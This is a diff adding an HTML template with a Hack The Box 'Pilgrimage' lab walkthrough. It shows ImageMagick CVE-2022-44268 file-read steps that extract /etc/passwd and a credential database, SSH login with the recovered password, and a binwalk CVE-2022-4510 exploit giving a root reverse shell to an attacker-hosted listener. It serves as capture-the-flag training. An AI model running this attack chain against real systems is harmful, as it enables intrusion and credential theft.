@@ -1,0 +1,268 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Pilgrimage</h1>
+    <p class="text">Difficulty Easy | UserDifficulty 3.9</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
+|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
+|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Did not follow redirect to http://pilgrimage.htb/
+|_http-server-header: nginx/1.18.0
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">HTTP server is open on target machine. Before browse there, let's add domain to /etc/hosts</p>
+
+<div class="code-box"><pre><code>└─$ echo '&lt;target_ip&gt; pilgrimage.htb' | sudo tee -a /etc/hosts</code></pre></div>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/pilgrimage/1-home.png' %}" alt="">
+    <p class="text">We can upload some file on this website. It's interesting and it may allow us exploit file upload vulnerability. But before we start it, let's enumerate deeper.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w &lt;your_wordlist&gt; -u http://pilgrimage.htb/ -t 70</u>
+===============================================================
+/.git/config          (Status: 200) [Size: 92]
+/.git                 (Status: 301) [Size: 169] [--&gt; http://pilgrimage.htb/.git/]
+/.hta                 (Status: 403) [Size: 153]
+/.git/index           (Status: 200) [Size: 3768]
+/.htpasswd            (Status: 403) [Size: 153]
+/.git/HEAD            (Status: 200) [Size: 23]
+/.git/logs/           (Status: 403) [Size: 153]
+/.htaccess            (Status: 403) [Size: 153]
+/assets               (Status: 301) [Size: 169] [--&gt; http://pilgrimage.htb/assets/]
+/index.php            (Status: 200) [Size: 7621]
+/tmp                  (Status: 301) [Size: 169] [--&gt; http://pilgrimage.htb/tmp/]
+/vendor               (Status: 301) [Size: 169] [--&gt; http://pilgrimage.htb/vendor/]
+
+===============================================================</code></pre></div>
+
+<p class="text">Luckily, we can access to .git directory. We can download the git files with git-dumper.</p>
+
+<div class="code-box"><pre><code>└─$ <u>python3 git_dumper.py http://pilgrimage.htb/.git ~/tempo/git</u>
+└─$ cd ~/tempo/git
+└─$ ls
+assets              dashboard.php  login.php   magick        vendor
+CVE-2022-44268-PoC  index.php      logout.php  register.php</code></pre></div>
+
+<h2 class="subtitle">Foothold</h2>
+
+<p class="text">There are several php files and executable file named <u>'magick'</u>. We can inspect download flow of pilgrimage with these files. Also, we can see the webserver uses tool magick. If magick has vulnerability, we can exploit it.</p>
+
+<div class="code-box"><pre><code>└─$ <u>./magick --version</u>
+Version: ImageMagick <u>7.1.0-49</u> beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org</code></pre></div>
+
+<p class="text">Google with keyword 'imagemagick 7.1.0-49 vulnerabilty', we fond <a href="https://www.tenable.com/plugins/nessus/171167">this</a> report. Because it holds Information Disclosure vulnerability, we're probably able to install arbitrary file.</p>
+
+<div class="code-box"><pre><code>└─$ cat ~/tempo/git/index.php
+ $upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
+      if(isset($_SESSION['user'])) {
+        $db = new PDO('sqlite: <u>/var/db/pilgrimage</u>');
+        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
+        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));</code></pre></div>
+
+        <p class="text">Sqlite database path is leaked in index.php we installed. We can download this file by using CVE-2022-44268.</p>
+
+<p class="text">This <a href="https://git.rotfl.io/v/CVE-2022-44268">poc</a> would be useful. Let's install and try it.</p>
+
+<div class="code-box"><pre><code>└─$ git clone https://git.rotfl.io/v/CVE-2022-44268
+└─$ cd CVE*
+└─$ cargo run "/etc/passwd"</code></pre></div>
+
+
+<p class="text">Then, upload the image file edited by above code and download output.</p>
+
+<div class="code-box"><pre><code>└─$ wget http://pilgrimage.htb/shrunk/68e1fb69a0a44.png <u class="green"># Replace with &lt;YOUR_OUTPUT&gt;</u></code></pre></div>
+<div class="code-box"><pre><code>└─$ <u>identify -verbose 68e1fb69a0a44.png</u>
+<u class="green">SNIP...</u>
+   png:text: 4 tEXt/zTXt/iTXt chunks were found
+    png:tIME: 2025-10-05T05:00:25Z
+    Raw profile type: 
+
+    1437
+726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
+6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
+6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
+2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
+6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
+62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
+<u class="green">...SNIPPED</u></code></pre></div>
+
+
+<div class="code-box"><pre><code>└─$ <u>identify -verbose 68e1fb69a0a44.png | grep -Pv "^( |Image)"  | xxd -r -p </u>
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+...</code></pre></div>
+
+<p class="text">It successfully read /etc/passwd file. Let's do this again but this time, install database file. We can do it with the same work flow.</p>
+
+<div class="code-box"><pre><code>└─$ cargo run "/var/db/pilgrimage"</code></pre></div>
+
+<p class="text">After download output...</p>
+
+<div class="code-box"><pre><code>└─$ <u>wget http://pilgrimage.htb/shrunk/68e1fc38dbb53.png</u>
+└─$ <u>identify -verbose 68e1fc38dbb53.png | grep -Pv "^( |Image)"  | xxd -r -p > pilgrimage.sqlite</u>
+└─$ ls
+68e1fb69a0a44.png  Cargo.lock  convert.py  hex2       <u>pilgrimage.sqlite</u>  screens  target
+68e1fc38dbb53.png  Cargo.toml  hex         image.png  README.md          src      test</code></pre></div>
+
+
+<p class="text">We can read this database with sqlite.</p>
+
+<div class="code-box"><pre><code>└─$ sqlite3 pilgrimage.sqlite
+SQLite version 3.46.1 2024-08-13 09:16:08
+Enter ".help" for usage hints.
+sqlite> .tables
+images  users 
+sqlite> select * from users;
+<u>emily|abigchonkyboi123</u></code></pre></div>
+
+
+<p class="text">Use this credential for establishing ssh connection with emily.</p>
+
+<div class="code-box"><pre><code>─$ <u>ssh emily@pilgrimage.htb</u>
+The authenticity of host 'pilgrimage.htb (10.129.137.25)' can't be established.
+ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
+Warning: Permanently added 'pilgrimage.htb' (ED25519) to the list of known hosts.
+emily@pilgrimage.htb's password: 
+Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+emily@pilgrimage:~$ </code></pre></div>
+
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>emily@pilgrimage:~$ <u>sudo -l</u>
+[sudo] password for emily: 
+Sorry, user emily may not run sudo on pilgrimage.
+emily@pilgrimage:~$ <u>find / -perm -4000 2>/dev/null</u>
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/su
+/usr/bin/chsh
+...
+
+emily@pilgrimage:/$ <u>find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys|dev)'</u>  
+/run/user/1000
+/run/user/1000/gnupg
+/run/user/1000/systemd
+...
+
+emily@pilgrimage:/$ <u>crontab -l; ls -la /etc/cron*; systemctl list-timers --all  </u>
+no crontab for emily
+-rw-r--r-- 1 root root 1042 Feb 23  2021 /etc/crontab
+...
+</code></pre></div>
+
+<p class="text">Though researching several vectors, there is no interesing information. However, seeing running process notify us interesting command run by root user. </p>
+
+
+
+<div class="code-box"><pre><code>emily@pilgrimage:/tmp$ ps auxww | grep root
+...
+root         764  0.0  0.0   2516   780 ?        S    15:05   0:00  \_ /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
+root         765  0.0  0.0   6816  2312 ?        S    15:05   0:00  \_ /bin/bash <u>/usr/sbin/malwarescan.sh</u>
+root         760  0.0  0.6 209752 27384 ?        Ss   15:05   0:00 php-fpm: master process (/etc
+...</code></pre></div>
+
+<p class="text">This executable isn't normal. It's worth searching.</p>
+
+<div class="code-box"><pre><code>emily@pilgrimage:/tmp$ <u>cat /usr/sbin/malwarescan.sh</u>
+#!/bin/bash
+
+blacklist=("Executable script" "Microsoft executable")
+
+/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
+        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
+        binout="$(/usr/local/bin/binwalk -e "$filename")"
+        for banned in "${blacklist[@]}"; do
+                if [[ "$binout" == *"$banned"* ]]; then
+                        /usr/bin/rm "$filename"
+                        break
+                fi
+        done
+done</code></pre></div>
+
+
+<p class="text">It watches /var/www/pilgrimage.htb/shrunk/ for newly created files, runs binwalk -e on each, and deletes the file if binwalk's output contains either “Executable script” or "Microsoft executable."</p>
+<p class="text">This file specifies full path, but uses several binaries. One of these may have vulnerability, so let's research.</p>
+
+<p class="text">With a little research, we can find the vulnearbility <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4510">CVE-2022-4510</a>. Also, exploit database publish <a href="https://www.exploit-db.com/exploits/51249">this poc file</a>.</p>
+
+
+
+<div class="code-box"><pre><code>└─$ <u>python3 51249.py -h</u>
+usage: 51249.py [-h] file ip port
+
+positional arguments:
+  file        Path to input .png file
+  ip          Ip to nc listener
+  port        Port to nc listener</code></pre></div>
+
+  <p class="text">It seems that we can use any file which has .png extension. It might hide some code which send reverse shell inside image file, and cause reverse shell with binwalk.</p>
+
+  <div class="code-box"><pre><code>└─$ <u>python3 51249.py &lt;some_png&gt; &lt;your_ip&gt; 4444</u>
+################################################
+------------------CVE-2022-4510----------------
+################################################
+--------Binwalk Remote Command Execution--------
+------Binwalk 2.1.2b through 2.3.2 included-----
+------------------------------------------------
+################################################
+----------Exploit by: Etienne Lacoche-----------
+---------Contact Twitter: @electr0sm0g----------
+------------------Discovered by:----------------
+---------Q. Kaiser, ONEKEY Research Lab---------
+---------Exploit tested on debian 11------------
+################################################
+
+
+You can now rename and share binwalk_exploit and start your local netcat listener.</code></pre></div>
+
+
+<p class="text">You can easily upload produced file with http server.</p>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+└─$ python3 -m http.server 8000</code></pre></div>
+
+<div class="code-box"><pre><code>emily@pilgrimage:/tmp$ cd /var/www/pilgrimage.htb/shrunk/
+emily@pilgrimage:/var/www/pilgrimage.htb/shrunk$ wget http://10.10.14.7:8000/binwalk_exploit.png</code></pre></div>
+
+<div class="code-box"><pre><code>└─$ <u>nc -lvnp 4444  </u>
+listening on [any] 4444 ...
+connect to [10.10.14.7] from (UNKNOWN) [10.129
+id
+<u>uid=0(root) gid=0(root) groups=0(root)</u></code></pre></div>
+
+<p class="text">You've got root user. You can find root flag on /root/root.txt</p>
+
+
+
+</body>
+</html>
